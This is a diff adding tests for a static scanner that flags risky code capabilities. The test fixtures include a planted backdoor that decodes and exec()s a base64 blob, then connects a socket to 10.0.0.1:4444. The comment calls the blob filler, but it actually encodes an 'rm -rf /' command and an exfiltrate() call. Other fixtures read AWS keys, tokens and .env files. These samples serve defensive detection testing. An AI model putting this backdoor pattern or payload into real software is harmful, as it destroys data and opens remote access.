@@ -297,3 +297,243 @@ def test_extract_and_persist_benign_writes_nothing(db_env, tmp_path):
     result = cap.extract_and_persist(aid, str(fp))
     assert result["capabilities_persisted"] == 0
     assert _capabilities(aid) == []
+
+
+# --------------------------------------------------------------------------- #
+# sipa-cap-02 — dynamic_code / crypto / env_secret / serialization / obfuscation
+# --------------------------------------------------------------------------- #
+
+# The acceptance fixture: a planted backdoor that base64-decodes a payload and
+# exec()s it, then opens a socket. Must yield network_egress + dynamic_code +
+# obfuscation. The base64 blob is bogus filler — the code is never executed.
+_BACKDOOR_SRC = '''\
+import base64
+import socket
+
+
+def stage():
+    blob = "aW1wb3J0IG9zCmltcG9ydCBzb2NrZXQKb3Muc3lzdGVtKCdybSAtcmYgLycpCmV4ZmlsdHJhdGUoKQ=="
+    payload = base64.b64decode(blob).decode()
+    exec(payload)
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(("10.0.0.1", 4444))
+    return s
+'''
+
+
+def test_backdoor_fixture_flags_network_dynamic_obfuscation(tmp_path):
+    """The headline acceptance test from the task."""
+    fp = _write(tmp_path, "backdoor.py", _BACKDOOR_SRC)
+    records = cap.extract(str(fp))
+    by_type = {r["capability_type"] for r in records}
+    assert "network_egress" in by_type
+    assert "dynamic_code" in by_type
+    assert "obfuscation" in by_type
+
+    # The exec() record knows its argument came from a decode call.
+    dyn = next(r for r in records if r["capability_type"] == "dynamic_code")
+    assert dyn["evidence"]["api"] == "exec"
+    assert dyn["evidence"].get("obfuscated_input") is True
+
+    # base64.b64decode flagged as an obfuscation decode, and the long blob flagged
+    # as a packed literal.
+    obf_kinds = {r["evidence"].get("kind") for r in records if r["capability_type"] == "obfuscation"}
+    assert "decode" in obf_kinds
+    assert "base64_literal" in obf_kinds
+
+    # Every record stays well-formed and weights match the constants.
+    for r in records:
+        assert r["capability_type"] in constants.CAPABILITY_TYPES
+        assert r["risk_weight"] == constants.RISK_WEIGHTS_CAPABILITY[r["capability_type"]]
+
+
+def test_dynamic_code_builtins_and_importlib(tmp_path):
+    src = (
+        "import importlib\n"
+        "import types\n"
+        "\n"
+        "def go(code):\n"
+        "    eval('1+1')\n"
+        "    exec(code)\n"
+        "    compile(code, '<s>', 'exec')\n"
+        "    __import__('os')\n"
+        "    importlib.import_module('socket')\n"
+        "    types.FunctionType(go.__code__, {})\n"
+    )
+    fp = _write(tmp_path, "dyn.py", src)
+    records = cap.extract(str(fp))
+    apis = {r["evidence"]["api"] for r in records if r["capability_type"] == "dynamic_code"}
+    assert {"eval", "exec", "compile", "__import__",
+            "importlib.import_module", "types.FunctionType"} <= apis
+
+
+def test_crypto_weak_hash_and_ssl(tmp_path):
+    src = (
+        "import hashlib\n"
+        "import ssl\n"
+        "\n"
+        "def h(data):\n"
+        "    hashlib.md5(data)\n"
+        "    hashlib.sha256(data)\n"
+        "    hashlib.new('sha1', data)\n"
+        "    ssl._create_unverified_context()\n"
+    )
+    fp = _write(tmp_path, "cry.py", src)
+    records = cap.extract(str(fp))
+    crypto = [r for r in records if r["capability_type"] == "crypto"]
+    by_api = {r["evidence"]["api"]: r["evidence"] for r in crypto}
+    assert by_api["hashlib.md5"].get("weak") is True
+    assert by_api["hashlib.md5"]["algorithm"] == "md5"
+    assert "weak" not in by_api["hashlib.sha256"]      # strong hash, not flagged weak
+    assert by_api["hashlib.new"].get("weak") is True   # new('sha1', ...) is weak
+    assert by_api["ssl._create_unverified_context"].get("insecure") is True
+
+
+def test_env_secret_environ_getenv_keyring(tmp_path):
+    src = (
+        "import os\n"
+        "import keyring\n"
+        "\n"
+        "def grab():\n"
+        "    a = os.environ['AWS_SECRET_ACCESS_KEY']\n"
+        "    b = os.getenv('API_TOKEN')\n"
+        "    c = os.environ.get('DB_PASSWORD')\n"
+        "    d = keyring.get_password('svc', 'user')\n"
+        "    return a, b, c, d\n"
+    )
+    fp = _write(tmp_path, "env.py", src)
+    records = cap.extract(str(fp))
+    env = [r for r in records if r["capability_type"] == "env_secret"]
+    apis = {r["evidence"]["api"] for r in env}
+    assert "os.environ[]" in apis
+    assert "os.getenv" in apis
+    assert "os.environ.get" in apis
+    assert "keyring.get_password" in apis
+    keys = {r["evidence"].get("key") for r in env}
+    assert "AWS_SECRET_ACCESS_KEY" in keys
+    assert "API_TOKEN" in keys
+
+
+def test_env_secret_reading_dotenv_file(tmp_path):
+    src = (
+        "def load():\n"
+        "    with open('/app/.env') as fh:\n"
+        "        return fh.read()\n"
+    )
+    fp = _write(tmp_path, "readenv.py", src)
+    records = cap.extract(str(fp))
+    types = {r["capability_type"] for r in records}
+    # A read of a secret-looking path is BOTH filesystem and env_secret.
+    assert "filesystem" in types
+    assert "env_secret" in types
+    env = next(r for r in records if r["capability_type"] == "env_secret")
+    assert env["evidence"]["path"] == "/app/.env"
+
+
+def test_env_secret_writing_normal_file_is_not_secret(tmp_path):
+    src = (
+        "def save():\n"
+        "    with open('/app/.env', 'w') as fh:\n"
+        "        fh.write('x')\n"
+    )
+    fp = _write(tmp_path, "writeenv.py", src)
+    records = cap.extract(str(fp))
+    # Writing is filesystem only — env_secret is reads of secret material.
+    assert "filesystem" in {r["capability_type"] for r in records}
+    assert "env_secret" not in {r["capability_type"] for r in records}
+
+
+def test_serialization_pickle_marshal_yaml(tmp_path):
+    src = (
+        "import pickle\n"
+        "import marshal\n"
+        "import shelve\n"
+        "import yaml\n"
+        "\n"
+        "def loadit(b):\n"
+        "    pickle.loads(b)\n"
+        "    marshal.loads(b)\n"
+        "    shelve.open('db')\n"
+        "    yaml.load(b)\n"
+        "    yaml.safe_load(b)\n"
+    )
+    fp = _write(tmp_path, "ser.py", src)
+    records = cap.extract(str(fp))
+    ser = [r for r in records if r["capability_type"] == "serialization"]
+    apis = {r["evidence"]["api"] for r in ser}
+    assert {"pickle.loads", "marshal.loads", "shelve.open", "yaml.load"} <= apis
+    assert "yaml.safe_load" not in apis        # safe loader is not flagged
+    pk = next(r for r in ser if r["evidence"]["api"] == "pickle.loads")
+    assert pk["evidence"].get("deserialize") is True
+    ya = next(r for r in ser if r["evidence"]["api"] == "yaml.load")
+    assert ya["evidence"].get("safe_loader") is False
+
+
+def test_serialization_yaml_safe_loader_kwarg_is_safe(tmp_path):
+    src = (
+        "import yaml\n"
+        "def cfg(b):\n"
+        "    return yaml.load(b, Loader=yaml.SafeLoader)\n"
+    )
+    fp = _write(tmp_path, "yamlsafe.py", src)
+    records = cap.extract(str(fp))
+    ser = [r for r in records if r["capability_type"] == "serialization"]
+    assert ser and ser[0]["evidence"].get("safe_loader") is True
+
+
+def test_obfuscation_char_code_assembly(tmp_path):
+    src = (
+        "def build():\n"
+        "    return bytes([104, 101, 108, 108, 111, 95, 119, 111, 114, 108, 100])\n"
+    )
+    fp = _write(tmp_path, "assemble.py", src)
+    records = cap.extract(str(fp))
+    obf = [r for r in records if r["capability_type"] == "obfuscation"]
+    assert any(r["evidence"].get("kind") == "char_code_assembly" for r in obf)
+
+
+def test_obfuscation_hex_literal(tmp_path):
+    blob = "deadbeef" * 10  # 80 hex chars, even length
+    src = f"PAYLOAD = '{blob}'\n"
+    fp = _write(tmp_path, "hexlit.py", src)
+    records = cap.extract(str(fp))
+    obf = [r for r in records if r["capability_type"] == "obfuscation"]
+    assert any(r["evidence"].get("kind") == "hex_literal" for r in obf)
+
+
+def test_obfuscation_zlib_and_binascii_decode(tmp_path):
+    src = (
+        "import zlib\n"
+        "import binascii\n"
+        "def d(b):\n"
+        "    zlib.decompress(b)\n"
+        "    binascii.unhexlify(b)\n"
+    )
+    fp = _write(tmp_path, "zb.py", src)
+    records = cap.extract(str(fp))
+    apis = {r["evidence"].get("api") for r in records if r["capability_type"] == "obfuscation"}
+    assert "zlib.decompress" in apis
+    assert "binascii.unhexlify" in apis
+
+
+def test_benign_short_strings_not_obfuscation(tmp_path):
+    # Ordinary code with short strings / normal hashes must not trip obfuscation.
+    src = (
+        "GREETING = 'hello world, this is a normal sentence with spaces.'\n"
+        "def f():\n"
+        "    return GREETING.upper()\n"
+    )
+    fp = _write(tmp_path, "plain.py", src)
+    records = cap.extract(str(fp))
+    assert [r for r in records if r["capability_type"] == "obfuscation"] == []
+
+
+def test_new_capabilities_persist(db_env, tmp_path):
+    fp = _write(tmp_path, "backdoor.py", _BACKDOOR_SRC)
+    aid = _new_assessment(db_env)
+    result = cap.extract_and_persist(aid, str(fp))
+    assert {"network_egress", "dynamic_code", "obfuscation"} <= set(result["by_type"])
+    rows = _capabilities(aid)
+    assert {"network_egress", "dynamic_code", "obfuscation"} <= {
+        r["capability_type"] for r in rows
+    }
